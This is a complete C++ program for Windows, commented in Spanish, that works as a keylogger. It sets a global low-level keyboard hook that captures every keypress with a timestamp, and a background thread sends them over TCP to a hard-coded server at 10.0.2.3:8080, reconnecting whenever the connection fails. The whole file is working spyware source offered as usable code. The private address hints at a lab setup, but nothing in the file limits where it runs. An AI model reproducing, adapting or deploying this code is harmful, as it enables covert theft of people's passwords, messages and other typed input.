#include <iostream>
#include <vector>
#include <string>
#include <queue>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

// --- Configuración ---
const char* SERVER_IP = "10.0.2.3";
const char* SERVER_PORT = "8080";

// --- Estructuras y Sincronización ---
struct KeyData {
    DWORD vkCode;
    ULONGLONG timestamp;
};

std::queue<KeyData> keyQueue;
std::mutex queueMtx;
std::condition_variable queueCv;
bool running = true;
HHOOK g_hook = nullptr;

// --- Utilidades de Red ---

bool sendAll(SOCKET sock, const char* buffer, int size) {
    int sent = 0;
    while (sent < size) {
        int res = send(sock, buffer + sent, size - sent, 0);
        if (res == SOCKET_ERROR) return false;
        sent += res;
    }
    return true;
}

void networkWorker() {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return;

    while (running) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            std::this_thread::sleep_for(std::chrono::seconds(2));
            continue;
        }

        addrinfo hints{}, *res = nullptr;
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;

        if (getaddrinfo(SERVER_IP, SERVER_PORT, &hints, &res) != 0) {
            closesocket(sock);
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }

        if (connect(sock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR) {
            freeaddrinfo(res);
            closesocket(sock);
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }
        freeaddrinfo(res);

        // Bucle de envío mientras la conexión sea estable
        while (running) {
            KeyData data;
            {
                std::unique_lock<std::mutex> lock(queueMtx);
                queueCv.wait_for(lock, std::chrono::milliseconds(500), [] { 
                    return !keyQueue.empty() || !running; 
                });

                if (!running && keyQueue.empty()) break;
                if (keyQueue.empty()) continue;

                data = keyQueue.front();
                keyQueue.pop();
            }

            // Estructura de datos simple: [Timestamp(8b)][VK(4b)]
            std::vector<char> packet(sizeof(data));
            memcpy(packet.data(), &data, sizeof(data));

            if (!sendAll(sock, packet.data(), (int)packet.size())) {
                break; // Error de red, intentar reconectar
            }
        }
        closesocket(sock);
    }
    WSACleanup();
}

// --- Hook de Teclado ---

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lParam;
        
        {
            std::lock_guard<std::mutex> lock(queueMtx);
            keyQueue.push({ kbs->vkCode, GetTickCount64() });
        }
        queueCv.notify_one();
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

// --- Main ---

int main() {
    std::thread netThread(networkWorker);

    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (!g_hook) {
        running = false;
        queueCv.notify_all();
        netThread.join();
        return 1;
    }

    std::cout << "Monitor activo. Presione Ctrl+C en la consola para salir (o termine el proceso).\n";

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    running = false;
    queueCv.notify_all();
    UnhookWindowsHookEx(g_hook);
    if (netThread.joinable()) netThread.join();

    return 0;
}
